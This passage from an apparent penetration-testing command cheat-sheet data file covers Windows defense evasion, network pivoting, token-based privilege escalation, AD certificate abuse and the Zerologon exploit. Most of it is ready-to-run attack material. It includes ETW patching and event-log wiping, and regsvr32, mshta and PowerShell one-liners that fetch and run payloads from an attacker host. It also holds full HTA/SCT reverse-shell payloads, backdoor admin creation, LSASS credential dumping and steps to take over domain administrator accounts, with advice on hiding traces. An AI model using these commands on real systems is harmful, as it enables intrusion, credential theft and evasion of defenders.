cmd:'$p=[Reflection.Assembly]::LoadWithPartialName("System.Core");$e=[Ref].Assembly.GetType("System.Diagnostics.Eventing.EventProvider");$f=$e.GetField("m_enabled","NonPublic,Instance");$o=[Ref].Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider").GetField("etwProvider","NonPublic,Static").GetValue($null);$f.SetValue($o,0)',
failureIndicators:['CLM blocks reflection','Field names differ in newer .NET','EDR uses kernel-level ETW (not bypassable from userspace)'],
notes:'ETW (Event Tracing for Windows) is the telemetry backbone used by EDRs (Defender ATP, CrowdStrike, etc.) to monitor .NET and PowerShell activity. This patches the ETW provider object in your current PS process — setting m_enabled=0 stops it emitting any events. Effect: EDR tools relying on userspace ETW become blind to your process. Does NOT affect disk AV. Combine with AMSI bypass for full in-memory evasion. Note: if the EDR patches ETW at kernel level (KPP), this approach does not work.'}

,{id:'EVASION_006',phase:'defense-evasion',title:'Clear Windows Event Logs',desc:'Wipe all Windows event logs to remove evidence of your activity',tool:'PowerShell',os:'windows',noise:'low',auth:'required',
cmd:'wevtutil el | ForEach-Object { wevtutil cl "$_" 2>$null }',
failureIndicators:['Need local admin or SYSTEM','Some logs protected from clearing'],
warning:'Log clearing itself is logged as EID 1102 (Security log cleared) and EID 104 (System log cleared) — a major blue team alert.',
notes:'wevtutil el = enumerate all log names. wevtutil cl = clear a specific log. This clears ALL logs. More targeted (less noise): wevtutil cl Security && wevtutil cl System && wevtutil cl "Microsoft-Windows-PowerShell/Operational". Clear early — before running offensive tools — not after, or you tie clearing to your activity. Alternative: Mimikatz event::dropNew suppresses new events without clearing. PowerShell one-liner to clear specific logs only: @("Security","System","Application") | ForEach-Object { wevtutil cl $_ }.'}

,{id:'EVASION_007',phase:'defense-evasion',title:'AppLocker Bypass — regsvr32 (Squiblydoo)',desc:'Execute code bypassing AppLocker using the trusted regsvr32.exe LOLBin',tool:'regsvr32',os:'windows',noise:'med',auth:'none',
cmd:'regsvr32.exe /s /n /u /i:http://{ATTACKER_IP}:8001/payload.sct scrobj.dll',
failureIndicators:['regsvr32 network access blocked by proxy','SCT format invalid','WDAC blocks unsigned scripts even via regsvr32'],
notes:'regsvr32.exe is a Microsoft-signed Windows binary (LOLBAS). AppLocker publisher rules allow it by default. It loads .sct (COM scriptlet) files remotely. Create payload.sct on your server: <scriptlet><registration><script language="JScript"><![CDATA[var s=new ActiveXObject("WScript.Shell");s.Run("powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).downloadString(\'http://{ATTACKER_IP}:8001/shell.ps1\')");]]><\/script><\/registration><\/scriptlet>. Other AppLocker bypass LOLBins: mshta.exe, installutil.exe /logfile= /LogToConsole=false payload.exe, msbuild.exe payload.csproj.'}

,{id:'EVASION_008',phase:'defense-evasion',title:'PowerShell Version 2 Downgrade',desc:'Use PSv2 to bypass AMSI and ScriptBlock Logging — both postdate PowerShell v2',tool:'PowerShell',os:'windows',noise:'low',auth:'none',
cmd:"powershell.exe -Version 2 -ExecutionPolicy Bypass -c \"IEX(New-Object Net.WebClient).downloadString(\'http://{ATTACKER_IP}:8001/script.ps1\')\"",
failureIndicators:['.NET Framework 2.0 not installed — required for PSv2','Error: Version 2 is not supported on this platform'],
notes:'PowerShell v2 predates AMSI (added in PS 3.0) and ScriptBlock Logging (added in PS 5.0). Running with -Version 2 means NEITHER protection exists for your session. Test availability first: powershell.exe -Version 2 -c "write-host works" — if it prints "works", you are good. If .NET 2.0 is missing it fails silently or errors. Hardening removes PSv2: Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root. Check if disabled: Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2.'}

,{id:'EVASION_009',phase:'defense-evasion',title:'PowerShell Language Mode Detection',desc:'Identify current PS language mode and what is enforcing restrictions',tool:'PowerShell',os:'windows',noise:'low',auth:'none',
cmd:'$ExecutionContext.SessionState.LanguageMode\nGet-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections',
failureIndicators:['Get-AppLockerPolicy needs admin','No AppLocker policy — CLM enforced by WDAC instead'],
notes:'FullLanguage = unrestricted PS. ConstrainedLanguage (CLM) blocks: .NET calls, Add-Type, COM objects, reflection — breaking PowerView, Rubeus, most offensive tools. Enforced by AppLocker script rules or WDAC. CLM bypass options: 1) Use LOLBins — InstallUtil.exe, MSBuild.exe, RunDLL32.exe can execute .NET outside CLM. 2) Use PSv2 downgrade if available. 3) Use a precompiled .NET binary (not PS script). 4) Find a PS runspace outside CLM scope. Check WDAC: Get-CIPolicy -FilePath \'C:\\Windows\\System32\\CodeIntegrity\\SIPolicy.p7b\' if exists.'}

,{id:'EVASION_010',phase:'defense-evasion',title:'LOLBAS mshta Execution',desc:'Execute HTA payload via trusted mshta.exe to bypass application whitelisting',tool:'mshta',os:'windows',noise:'med',auth:'none',
cmd:'mshta.exe http://{ATTACKER_IP}:8001/payload.hta',
failureIndicators:['mshta blocked by WDAC or AppLocker','SmartScreen blocks the HTA','Network access filtered'],
notes:'mshta.exe (Microsoft HTML Application Host) is a trusted Windows binary that runs .hta files containing VBScript or JScript with FULL system access. Create payload.hta on your server: <html><head><script language="VBScript">Dim oShell:Set oShell=CreateObject("WScript.Shell"):oShell.Run "powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).downloadString(\'http://{ATTACKER_IP}:8001/shell.ps1\')",0,False:self.close<\/script><\/head><\/html>. Also works locally: mshta.exe C:\\Temp\\payload.hta. Serve via Python HTTP server: python3 -m http.server 8001.'}

,{id:'TUNNEL_001',phase:'lateral-movement',title:'Chisel Server (Attacker Side)',desc:'Start Chisel SOCKS5 proxy server on attacker to receive tunnel from compromised host',tool:'Chisel',os:'linux',noise:'low',auth:'none',
cmd:'./chisel server -p 8080 --reverse --socks5',
failureIndicators:['Port 8080 in use — change with -p','chmod +x chisel if not executable','Inbound 8080 blocked by firewall'],
notes:'Chisel tunnels TCP over HTTP — ideal when only HTTP outbound is allowed from the target. Run THIS on your machine first. --reverse = clients create reverse tunnels back to you. --socks5 = SOCKS5 mode. After client connects, your machine will have SOCKS5 at 127.0.0.1:1080. Configure proxychains: echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf. Then use any tool via proxychains. Download both attacker and target binaries from: https://github.com/jpillora/chisel/releases (pick correct OS/arch for each side).'}

,{id:'TUNNEL_002',phase:'lateral-movement',title:'Chisel Client SOCKS5 (Target Side)',desc:'Connect compromised host to attacker Chisel server — creates SOCKS5 tunnel into internal network',tool:'Chisel',os:'windows',noise:'low',auth:'none',
cmd:'.\\chisel.exe client {ATTACKER_IP}:8080 R:socks',
failureIndicators:['Chisel server not running on attacker','AV blocks the binary','Outbound HTTP to attacker filtered'],
notes:'Run on the COMPROMISED HOST. R:socks = create a reverse SOCKS5 proxy. After connecting, your attacker machine has a SOCKS5 proxy at 127.0.0.1:1080 routing ALL traffic through the compromised host into its internal network. Use: proxychains nmap -sT -Pn -p 80,443,445,3389 {INTERNAL_IP}. Important: always use -sT (TCP connect) with proxychains — -sS (SYN scan) requires raw sockets and does not work through SOCKS. Upload chisel.exe: Invoke-WebRequest http://{ATTACKER_IP}:8001/chisel.exe -OutFile C:\\Temp\\chisel.exe.'}

,{id:'TUNNEL_003',phase:'lateral-movement',title:'Chisel Reverse Port Forward',desc:'Forward a specific internal service port back to attacker machine through Chisel',tool:'Chisel',os:'windows',noise:'low',auth:'none',
cmd:'.\\chisel.exe client {ATTACKER_IP}:8080 R:4445:{INTERNAL_IP}:445',
failureIndicators:['Chisel server not running','Attacker port already in use','Internal target port closed'],
notes:'R:LOCAL_PORT:INTERNAL_IP:INTERNAL_PORT. This makes 172.16.5.5:445 accessible at your attacker machine on localhost:4445. Then run Linux tools directly: impacket-secretsdump {DOMAIN}/{USERNAME}:{PASSWORD}@127.0.0.1 -p 4445. Replace 172.16.5.5:445 with your target. Multiple forwards at once: R:4445:10.0.0.1:445 R:8888:10.0.0.2:80. No proxychains needed — the port is local to your machine.'}

,{id:'TUNNEL_004',phase:'lateral-movement',title:'Ligolo-ng Proxy (Attacker Side)',desc:'Start Ligolo-ng transparent proxy — no proxychains needed to reach internal IPs',tool:'Ligolo-ng',os:'linux',noise:'low',auth:'none',
cmd:'sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up && ./proxy -selfcert -laddr 0.0.0.0:11601',
failureIndicators:['Needs sudo for TUN device','Port 11601 in use','ligolo interface already exists — skip first two commands'],
notes:'Ligolo-ng creates a TRANSPARENT tunnel — you can directly nmap/connect to internal IPs without proxychains. Three setup commands (run once): 1) Create TUN interface. 2) Bring it up. 3) Start proxy. After agent connects: in Ligolo console type "session" → select session → type "ifconfig" to see internal networks → type "start" to activate. Add route: sudo ip route add 172.16.5.0/24 dev ligolo. Now: nmap 172.16.5.5 works directly. Download: https://github.com/nicocha30/ligolo-ng/releases'}

,{id:'TUNNEL_005',phase:'lateral-movement',title:'Ligolo-ng Agent (Target Side)',desc:'Run Ligolo-ng agent on compromised host — connects back to your transparent proxy',tool:'Ligolo-ng',os:'windows',noise:'low',auth:'none',
cmd:'.\\agent.exe -connect {ATTACKER_IP}:11601 -ignore-cert',
failureIndicators:['Proxy not started on attacker','AV flags the agent binary','Outbound to port 11601 blocked'],
notes:'Run on the COMPROMISED HOST. -ignore-cert skips TLS check for self-signed cert. Once connected, go to your proxy console: type "session" → select it → "ifconfig" shows the target machine network interfaces → note internal subnets → "start" activates the tunnel. Then on attacker add the route: sudo ip route add {TARGET_SUBNET}/24 dev ligolo. Now directly reach internal hosts — no proxychains, no port forwarding. Traffic looks like normal HTTPS (port 11601). Very clean for multi-hop: add more agents on deeper networks.'}

,{id:'TUNNEL_006',phase:'lateral-movement',title:'SSH Dynamic SOCKS Proxy (Pivoting)',desc:'Create a SOCKS5 proxy through SSH for pivoting into the internal network',tool:'SSH',os:'linux',noise:'low',auth:'required',
cmd:'ssh -D 1080 -f -C -q -N {USERNAME}@{TARGET_HOST}',
failureIndicators:['SSH port 22 closed','Auth failed','Port 1080 already in use'],
notes:'Creates SOCKS5 proxy on localhost:1080 routing through the SSH server. -D = dynamic port forward (SOCKS). -f = go background after auth. -C = compress traffic (faster). -q = quiet. -N = no shell, just forward. After running: add "socks5 127.0.0.1 1080" to /etc/proxychains4.conf. Use: proxychains nmap -sT -Pn 172.16.5.0/24. With SSH key: add -i /path/to/key.pem. Check SSH is open first: nmap -p 22 {TARGET_HOST}. Stop later with: kill $(pgrep -f "ssh -D 1080").'}

,{id:'TUNNEL_007',phase:'lateral-movement',title:'SSH Local Port Forward',desc:'Forward a remote internal service to your local machine through SSH',tool:'SSH',os:'linux',noise:'low',auth:'required',
cmd:'ssh -L 1433:{INTERNAL_IP}:1433 {USERNAME}@{TARGET_HOST} -N',
failureIndicators:['Local port already in use','SSH connection fails','Internal host not reachable from pivot'],
notes:'-L LOCAL_PORT:INTERNAL_HOST:INTERNAL_PORT. This makes 172.16.5.25:1433 (internal MSSQL) accessible at your localhost:1433 — no proxychains needed. Then: impacket-mssqlclient localhost -U sa -P password. Common uses: RDP (-L 3389:10.x.x.x:3389), web (-L 8080:10.x.x.x:80), SMB (-L 4445:10.x.x.x:445 — then smbclient //localhost/share -p 4445). -N = no shell. Combine -f -N to background immediately.'}

,{id:'TUNNEL_008',phase:'lateral-movement',title:'SSH Remote Port Forward',desc:'Expose your local service (e.g. HTTP server) on the compromised host via reverse SSH',tool:'SSH',os:'linux',noise:'low',auth:'required',
cmd:'ssh -R 8001:localhost:8001 {USERNAME}@{TARGET_HOST} -N',
failureIndicators:['GatewayPorts not set in sshd_config','Auth fails','Port 8001 in use on remote'],
notes:'-R REMOTE_PORT:LOCAL_HOST:LOCAL_PORT. Makes your localhost:8001 (Python HTTP server) accessible on the SSH server at its localhost:8001. Useful when the compromised host cannot directly reach your attacker IP but CAN reach the SSH server. On target: Invoke-WebRequest http://127.0.0.1:8001/tool.exe -OutFile C:\\Temp\\tool.exe. Requires GatewayPorts yes in /etc/ssh/sshd_config. -N = no shell.'}

,{id:'TUNNEL_009',phase:'lateral-movement',title:'Proxychains Configuration and Usage',desc:'Route any TCP tool through a SOCKS proxy into the internal network',tool:'proxychains',os:'linux',noise:'low',auth:'none',
cmd:'echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf && proxychains -q nmap -sT -Pn -p 22,80,135,445,3389,5985 {INTERNAL_IP}',
failureIndicators:['Proxy not running on port 1080','Tool uses UDP — not supported through SOCKS','proxychains not installed: apt install proxychains4'],
notes:'proxychains forces all TCP connections through your SOCKS proxy (set up via Chisel, Ligolo SSH-D). Comment out existing proxy lines in /etc/proxychains4.conf, then add your proxy. ALWAYS use -sT with nmap (TCP connect) — SYN scan (-sS) needs raw sockets and fails through SOCKS. -q suppresses proxy output. Add proxy_dns to config to route DNS too. Any tool works: proxychains evil-winrm -i {INTERNAL_IP}, proxychains impacket-secretsdump, proxychains crackmapexec smb. For custom config file: proxychains4 -f /tmp/myproxy.conf nmap ...'}

,{id:'TUNNEL_010',phase:'lateral-movement',title:'ntlmrelayx SOCKS Mode',desc:'Keep relayed NTLM sessions alive as authenticated SOCKS proxies — no passwords needed',tool:'Impacket',os:'linux',noise:'med',auth:'none',
cmd:'impacket-ntlmrelayx -tf targets.txt -socks -smb2support -no-http-server',
failureIndicators:['SMB signing enabled on all targets','No NTLM auths captured','targets.txt empty'],
notes:'When ntlmrelayx relays an NTLM auth it keeps the session alive as a SOCKS proxy. Setup: 1) Run Responder first with SMB off: responder -I {INTERFACE} -Pd. 2) Run ntlmrelayx with -socks. 3) When relay succeeds it prints: "SOCKS: Adding {NETBIOS}/{USERNAME}@{TARGET_IP}(445)". 4) In ntlmrelayx console type "socks" to list live sessions. 5) Use: proxychains impacket-secretsdump -no-pass {NETBIOS}/{USERNAME}@{TARGET_IP}. No password needed — session already authenticated. Also works for WinRM: proxychains evil-winrm -i {TARGET_IP} -u {USERNAME} -p "". Very powerful for lateral movement.'}

,{id:'TUNNEL_011',phase:'lateral-movement',title:'Socat Port Redirect',desc:'Relay traffic between ports on a pivot host to reach internal services',tool:'socat',os:'linux',noise:'low',auth:'none',
cmd:'socat TCP-LISTEN:4445,fork TCP:{INTERNAL_IP}:445',
failureIndicators:['socat not installed: apt install socat','Port 4445 in use','Internal host unreachable from pivot'],
notes:'socat listens on a local port and relays all traffic to another host:port. Upload to a Linux pivot: wget http://{ATTACKER_IP}:8001/socat -O /tmp/socat && chmod +x /tmp/socat. For Windows pivots use netsh instead: netsh interface portproxy add v4tov4 listenport=4445 listenaddress=0.0.0.0 connectport=445 connectaddress=172.16.5.5 (then netsh interface portproxy show all to list). After socat is running on pivot: impacket-secretsdump {DOMAIN}/{USERNAME}:{PASSWORD}@{PIVOT_IP} -p 4445. fork = handles multiple simultaneous connections. Kill socat: kill $(pgrep socat).'}

,{id:'TOKEN_001',phase:'privilege-escalation',title:'PrintSpoofer (SeImpersonatePrivilege → SYSTEM)',desc:'Escalate from a service account to SYSTEM using Print Spooler impersonation',tool:'PrintSpoofer',os:'windows',noise:'med',auth:'none',
cmd:'whoami /priv\nPrintSpoofer.exe -i -c cmd.exe',
failureIndicators:['SeImpersonatePrivilege not listed in whoami /priv','Print Spooler service stopped: sc query spooler','Binary flagged by AV'],
notes:'First check your privileges: whoami /priv — if SeImpersonatePrivilege is listed (even "Disabled"), you can escalate. This privilege is typically held by IIS app pools (IIS APPPOOL\\), MSSQL service (NT SERVICE\\MSSQLSERVER), and LocalService/NetworkService accounts. PrintSpoofer coerces SYSTEM to authenticate to a named pipe you control, then impersonates that token. -i = interactive shell. -c = command to run as SYSTEM. To add a backdoor admin silently: -c "net user hacker Pass123! /add && net localgroup administrators hacker /add". Download: https://github.com/itm4n/PrintSpoofer'}

,{id:'TOKEN_002',phase:'privilege-escalation',title:'GodPotato (SeImpersonatePrivilege → SYSTEM)',desc:'Universal Potato for Windows 2012–2022 — get SYSTEM from any service account',tool:'GodPotato',os:'windows',noise:'med',auth:'none',
cmd:'GodPotato.exe -cmd "cmd /c whoami"',
failureIndicators:['SeImpersonatePrivilege not held — check: whoami /priv','AV blocks GodPotato.exe','Windows version not in 2012-2022 range'],
notes:'GodPotato is the most modern Potato (2023). Works on Windows Server 2012-2022 and Windows 8-11. SeImpersonatePrivilege is held by IIS, MSSQL, and any LocalService/NetworkService account. Check: whoami /priv | findstr Impersonate. Replace "cmd /c whoami" with your payload: GodPotato.exe -cmd "net user hacker Pass123! /add" then GodPotato.exe -cmd "net localgroup administrators hacker /add". For reverse shell: GodPotato.exe -cmd "powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).downloadString(\'http://{ATTACKER_IP}:8001/shell.ps1\')". Download: https://github.com/BeichenDream/GodPotato'}

,{id:'TOKEN_003',phase:'privilege-escalation',title:'SweetPotato (Token Impersonation via DCOM)',desc:'Escalate to SYSTEM using DCOM/WinRM trigger when other Potatoes fail',tool:'SweetPotato',os:'windows',noise:'med',auth:'none',
cmd:'SweetPotato.exe -a "whoami /all"',
failureIndicators:['SeImpersonatePrivilege not held','DCOM disabled by policy','AV flags binary'],
notes:'SweetPotato combines DCOM trigger, WinRM trigger, and scheduled task abuse in one tool. Use when PrintSpoofer/GodPotato fail (e.g. Print Spooler disabled). Triggers a privileged process to connect to your named pipe. -a = command to run as SYSTEM. Other Potato variants: RoguePotato (OXID resolver abuse — useful in non-domain environments), JuicyPotato (older systems — needs correct CLSID per Windows version: find at https://github.com/ohpe/juicy-potato/tree/master/CLSID), RottenPotato (original, very old). Always check whoami /priv first.'}

,{id:'TOKEN_004',phase:'privilege-escalation',title:'Incognito — List Available Tokens',desc:'List all impersonation tokens on the machine to find privileged user sessions',tool:'Incognito',os:'windows',noise:'low',auth:'required',
cmd:'.\\incognito.exe list_tokens -u',
failureIndicators:['Need SYSTEM or local admin','No interesting tokens present','AV flags binary'],
notes:'Windows access tokens represent logged-in users and their privileges. If a Domain Admin has an active session on this machine (RDP, PsExec, scheduled task), their token may be present and you can steal it. -u = user tokens. Two token types: Delegation (strongest — works over the network), Impersonation (local use only). After finding a DA token: .\\incognito.exe execute -c "{NETBIOS}\\{TARGET_USER}" cmd.exe. Meterpreter alternative: load incognito → list_tokens -u → impersonate_token "DOMAIN\\\\DomainAdmin". Mimikatz also lists tokens: token::list.'}

,{id:'TOKEN_005',phase:'privilege-escalation',title:'Incognito — Impersonate Token',desc:'Steal a specific user token to inherit their identity and access rights',tool:'Incognito',os:'windows',noise:'low',auth:'required',
cmd:'.\\incognito.exe execute -c "{NETBIOS}\\{TARGET_USER}" cmd.exe',
failureIndicators:['Token not available on this host','Token is Impersonation-level (local only, no network access)','Access denied'],
notes:'After list_tokens finds a high-value token, use this to spawn a process as that user. Verify: run whoami inside the new shell. Delegation tokens allow full network access (access DC shares, run DCSync, etc.). Impersonation tokens only work locally. If you impersonate a DA: you can now run PowerView, secretsdump, BloodHound as DA. If binary is AV-flagged: use Meterpreter (load incognito → impersonate_token "DOMAIN\\\\DomainAdmin") or Mimikatz (token::elevate /domainadmin then token::impersonate).'}

,{id:'TOKEN_006',phase:'privilege-escalation',title:'SeDebugPrivilege — Dump LSASS via Mimikatz',desc:'Use SeDebugPrivilege to read LSASS memory and extract all cached credentials',tool:'Mimikatz',os:'windows',noise:'high',auth:'required',
cmd:'privilege::debug\nsekurlsa::logonpasswords',
failureIndicators:['SeDebugPrivilege denied — not local admin','LSASS PPL-protected: try !sekurlsa::logonpasswords with mimidrv.sys','Credential Guard blocks NTLM hash extraction'],
notes:'SeDebugPrivilege allows opening ANY process including LSASS (Local Security Authority Subsystem). Only local admins have this. Check: whoami /priv | findstr Debug. In Mimikatz: privilege::debug enables the privilege → sekurlsa::logonpasswords reads LSASS and extracts cleartext passwords (if WDigest enabled), NTLM hashes, Kerberos tickets. If LSASS is PPL-protected: use !sekurlsa::logonpasswords (requires mimidrv.sys kernel driver). Alternative no-Mimikatz LSASS dump: rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump {LSASS_PID} C:\\Temp\\lsass.dmp full — then parse offline with Mimikatz: sekurlsa::minidump lsass.dmp.'}

,{id:'ESC_001',phase:'credential-access',title:'Certipy ESC2 (Any Purpose Template)',desc:'Abuse a template with Any Purpose EKU to request certs authenticating as any user',tool:'Certipy',os:'linux',noise:'low',auth:'required',
cmd:"certipy find -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -vulnerable -stdout\ncertipy req -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -ca {CA_NAME} -template {TEMPLATE_NAME} -upn administrator@{DOMAIN}",
failureIndicators:['No ESC2 templates found','Enrollment rights denied','CA not reachable on 443/TCP'],
notes:'ESC2: A template with "Any Purpose" EKU (OID 2.5.29.37.0) or no EKU (SubCA) can be used for ANY authentication. Step 1: Find ESC2 templates — certipy find -vulnerable labels them [ESC2]. Note the CA name and template name. Step 2: Request a certificate specifying -upn administrator@{DOMAIN} to embed the admin UPN in the SAN. Step 3: Authenticate: certipy auth -pfx administrator.pfx -dc-ip {DC_IP} — returns the admin NTLM hash. Step 4: Use hash for PTH: impacket-secretsdump -just-dc {DOMAIN}/administrator@{DC_IP} -hashes :{ADMIN_HASH}.'}

,{id:'ESC_002',phase:'credential-access',title:'Certipy ESC3 (Enrollment Agent)',desc:'Use an Enrollment Agent cert to request certificates on behalf of any domain user',tool:'Certipy',os:'linux',noise:'low',auth:'required',
cmd:"certipy req -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -ca {CA_NAME} -template {ENROLLMENT_AGENT_TEMPLATE}\ncertipy req -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -ca {CA_NAME} -template User -on-behalf-of \"{NETBIOS}\\Administrator\" -pfx {USERNAME}.pfx",
failureIndicators:['No Enrollment Agent template found','on-behalf-of restricted by CA issuance policy','Enrollment denied for your account'],
notes:'ESC3 is a two-step attack. Step 1: Request a cert using a template with Certificate Request Agent EKU (OID 1.3.6.1.4.1.311.20.2.1). This becomes your enrollment agent cert. Step 2: Use that cert with -pfx to request another cert ON BEHALF OF any user — including Administrator. The second cert contains the target user identity. Find ESC3 templates: certipy find -vulnerable (labeled [ESC3]). Final: certipy auth -pfx administrator.pfx -dc-ip {DC_IP} to get admin NTLM hash.'}

,{id:'ESC_003',phase:'credential-access',title:'Certipy ESC7 (Vulnerable CA ACL)',desc:'Exploit ManageCA rights to enable the SubCA template and issue admin certificates',tool:'Certipy',os:'linux',noise:'low',auth:'required',
cmd:"certipy ca -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -ca {CA_NAME} -add-officer {USERNAME}\ncertipy ca -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -ca {CA_NAME} -enable-template SubCA\ncertipy req -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -ca {CA_NAME} -template SubCA -upn administrator@{DOMAIN}",
failureIndicators:['No ManageCA rights on CA object','SubCA template not available','Request fails with access denied'],
notes:"ESC7: If you have ManageCA or ManageCertificates rights on the CA, you effectively own ADCS. Step 1: Add yourself as CA officer (grants ManageCertificates rights). Step 2: Enable the SubCA template (allows issuing sub-CA certs with arbitrary SAN). Step 3: Request a SubCA cert for administrator — this will FAIL with 'denied' but saves the request ID and private key locally. Step 4: Approve the pending request as CA officer: certipy ca -issue-request {REQUEST_ID} -ca {CA_NAME} -u {USERNAME}@{DOMAIN} -p '{PASSWORD}'. Step 5: Retrieve the cert: certipy req -retrieve {REQUEST_ID} -ca {CA_NAME} -u {USERNAME}@{DOMAIN} -p '{PASSWORD}'. Step 6: Auth: certipy auth -pfx administrator.pfx -dc-ip {DC_IP}."}

,{id:'ESC_004',phase:'credential-access',title:'Certipy ESC9 (No Security Extension)',desc:'Change a user UPN then request cert to authenticate as admin when CT_FLAG_NO_SECURITY_EXTENSION is set',tool:'Certipy',os:'linux',noise:'low',auth:'required',
cmd:"certipy account update -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -user {TARGET_USER} -upn administrator@{DOMAIN}\ncertipy req -u {TARGET_USER}@{DOMAIN} -hashes :{TARGET_NTHASH} -dc-ip {DC_IP} -ca {CA_NAME} -template {ESC9_TEMPLATE}\ncertipy account update -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -user {TARGET_USER} -upn {TARGET_USER}@{DOMAIN}",
failureIndicators:['GenericWrite not available on target user','Template missing CT_FLAG_NO_SECURITY_EXTENSION','StrongCertificateBindingEnforcement=2 on DC (fully enforced)'],
notes:'ESC9 requires: GenericWrite on a user account AND a template with msPKI-Enrollment-Flag 0x4 (CT_FLAG_NO_SECURITY_EXTENSION). Step 1: Change target user UPN to administrator@{DOMAIN} using GenericWrite. Step 2: Request the ESC9 template cert as that user — because the cert has no SID binding extension, the DC maps auth by UPN at enrollment time (now "administrator"). Step 3: IMMEDIATELY revert the UPN to avoid locking the real admin out. Step 4: certipy auth -pfx administrator.pfx -domain {DOMAIN} -dc-ip {DC_IP}. Check DC enforcement level: reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc /v StrongCertificateBindingEnforcement (0 or 1 = vulnerable).'}

,{id:'ESC_005',phase:'credential-access',title:'Certipy ESC10 (Weak Certificate Mapping)',desc:'Set user UPN to DC machine account name to obtain a DC certificate for DCSync',tool:'Certipy',os:'linux',noise:'low',auth:'required',
cmd:"certipy account update -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -user {TARGET_USER} -upn {DC_NAME}$\ncertipy req -u {TARGET_USER}@{DOMAIN} -hashes :{TARGET_NTHASH} -dc-ip {DC_IP} -ca {CA_NAME} -template Machine\ncertipy account update -u {USERNAME}@{DOMAIN} -p '{PASSWORD}' -dc-ip {DC_IP} -user {TARGET_USER} -upn {TARGET_USER}@{DOMAIN}\ncertipy auth -pfx {DC_NAME}.pfx -domain {DOMAIN} -dc-ip {DC_IP}",
failureIndicators:['StrongCertificateBindingEnforcement=2','GenericWrite not held on target user','Machine template enrollment denied for user account'],
notes:'ESC10 Case 1: Requires GenericWrite on a user + StrongCertificateBindingEnforcement is 0 or 1. Step 1: Change user UPN to {DC_NAME}$ (the DC machine account — note the $ sign). Step 2: Request a Machine template cert as that user. The cert maps to the DC$ account. Step 3: Revert UPN immediately. Step 4: certipy auth returns the DC machine account NTLM hash via PKINIT (UnPACing). Step 5: DCSync using the DC hash: impacket-secretsdump -just-dc {DOMAIN}/{DC_NAME}$@{DC_IP} -hashes :{DC_HASH}. Check: reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc /v StrongCertificateBindingEnforcement on the DC.'}

,{id:'ESC_006',phase:'credential-access',title:'PassTheCert (LDAP Auth via Certificate)',desc:'Authenticate directly to LDAP using a certificate — no Kerberos or NTLM needed',tool:'PassTheCert',os:'linux',noise:'low',auth:'required',
cmd:'openssl pkcs12 -in administrator.pfx -nokeys -out admin.crt -nodes\nopenssl pkcs12 -in administrator.pfx -nocerts -out admin.key -nodes\npython3 passthecert.py -action ldap-shell -crt admin.crt -key admin.key -domain {DOMAIN} -dc-ip {DC_IP}',
failureIndicators:['LDAPS (port 636) not available','Certificate not trusted by DC CA','Wrong certificate format'],
notes:'PassTheCert authenticates to LDAPS using a certificate directly — bypasses Kerberos PKINIT failures. Useful when you have a valid cert (from any ESC attack) but certipy auth fails. Step 1: Extract cert (.crt) and private key (.key) from PFX using two openssl commands. Step 2: passthecert.py opens an interactive LDAP shell. Available LDAP shell commands: add_user_to_group {USERNAME} "Domain Admins", set_rbcd {COMPUTER}$ {TARGET_COMPUTER}$, add_computer {NAME} {PASS}, change_password {USER} {NEWPASS}. Download: https://github.com/AlmondOffSec/PassTheCert. Alternative: certipy auth -pfx cert.pfx -ldap-shell -dc-ip {DC_IP}.'}

,{id:'ZEROLOGON_001',phase:'domain-dominance',title:'Zerologon Vulnerability Check (CVE-2020-1472)',desc:'Safely test if the DC is unpatched for Zerologon without changing any passwords',tool:'Impacket',os:'linux',noise:'low',auth:'none',
cmd:'python3 zerologon_tester.py {DC_NAME} {DC_IP}',
failureIndicators:['DC patched (KB4571694 Aug 2020)','Script not found — clone: https://github.com/SecuraBV/CVE-2020-1472','Connection refused on RPC'],
warning:'Use the TESTER only. Do NOT run the exploit on production without planning the password restore step first.',
notes:'Zerologon (CVE-2020-1472) is a CVSS 10.0 flaw in the MS-NRPC Netlogon protocol. A cryptographic weakness lets unauthenticated attackers reset the DC machine account password to empty in seconds — no credentials needed. Tester output "DC is VULNERABLE" = you can own the domain without any creds. Patched August 2020 with KB4571694. Affects all unpatched Windows Server versions. Check patch level before testing: nmap --script smb2-security-mode {DC_IP} or check wmic qfe list on DC for KB4571694.'}

,{id:'ZEROLOGON_002',phase:'domain-dominance',title:'Zerologon Exploit (CVE-2020-1472)',desc:'Set DC machine password to empty via Zerologon then DCSync all hashes',tool:'Impacket',os:'linux',noise:'high',auth:'none',
cmd:'python3 cve-2020-1472-exploit.py {DC_NAME} {DC_IP}\nimpacket-secretsdump -just-dc {NETBIOS}/{DC_NAME}$@{DC_IP}',
failureIndicators:['DC is patched','Wrong DC name — use short NetBIOS name not FQDN','NetLogon RPC blocked'],
warning:'DESTRUCTIVE — breaks Kerberos trust if you forget to restore. Save original DC$ hash FIRST. Restore with: python3 restorepassword.py {NETBIOS}/{DC_NAME}@{DC_IP} -target-ip {DC_IP} -hexpass {ORIGINAL_HEXHASH}',
